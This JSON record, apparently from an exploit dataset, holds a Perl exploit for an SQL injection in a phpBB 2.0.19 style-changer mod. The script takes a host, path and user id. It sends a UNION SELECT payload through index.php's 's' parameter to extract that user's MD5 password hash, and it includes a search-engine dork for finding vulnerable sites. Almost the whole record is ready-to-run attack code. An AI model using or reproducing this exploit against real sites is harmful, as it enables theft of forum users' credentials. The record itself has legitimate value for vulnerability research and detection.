{
  "id": "1469",
  "title": "phpBB 2.0.19 - Style Changer/Demo Mod SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#########################################################\r\n#\t\t _______ _______ ______ \t\t#\r\n#\t\t |______ |______ |     \\\t\t#\r\n#\t\t ______| |______ |_____/\t\t#\r\n#\t\t                        \t\t#\r\n#phpBB Style Changer/Demo Mod-->GET HASH EXPLOIT\t#\r\n#Created By SkOd                                        #\r\n#SED security Team                                      #\r\n#http://www.sed-team.be                                 #\r\n#skod.uk@gmail.com                                      #\r\n#ISRAEL                                                 #\r\n#########################################################\r\n#google:\r\n#\"Powered by phpBB\" inurl:\"index.php?s\" OR inurl:\"index.php?style\"\r\n#########################################################\r\nuse IO::Socket;\r\nif (@ARGV < 3){\r\nprint q{\r\n############################################################\r\n#   phpBB Style Changer\\Viewer MOD SQL injection Exploit   #\r\n#\t\tTested on phpBB 2.0.19\t\t\t   #\r\n#\t    created By SkOd. SED Security Team             #\r\n############################################################\r\n\tbbstyle.pl [HOST] [PATH] [Target id]\r\n\t bbstyle.pl www.host.com /phpbb2/ 2\r\n############################################################\r\n};\r\nexit;\r\n}\r\n$serv = $ARGV[0];\r\n$dir = $ARGV[1];\r\n$id = $ARGV[2];\r\nprint \"[+]Make Connection\\n\";\r\n$serv =~ s/(http:\\/\\/)//eg;\r\n$path = $dir.'index.php?s=-99%20UNION%20SELECT%20null,user_password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20FROM%20phpbb_users%20Where%20user_id='.$id.'/*';\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$serv\", PeerPort => \"80\") || die \"[-]Connect Failed\\r\\n\";\r\nprint $socket \"GET $path HTTP/1.1\\n\";\r\nprint $socket \"Host: $serv\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\nprint \"[+]Connected\\n\";\r\nwhile ($hash = <$socket>){\r\n$hash =~ m/open(.*?)template/ && print \"[+]User id: $id\\n[+]Md5 Hash: $1\\n\";\r\n}\r\n\r\n# milw0rm.com [2006-02-05]",
  "url": "https://www.exploit-db.com/exploits/1469"
}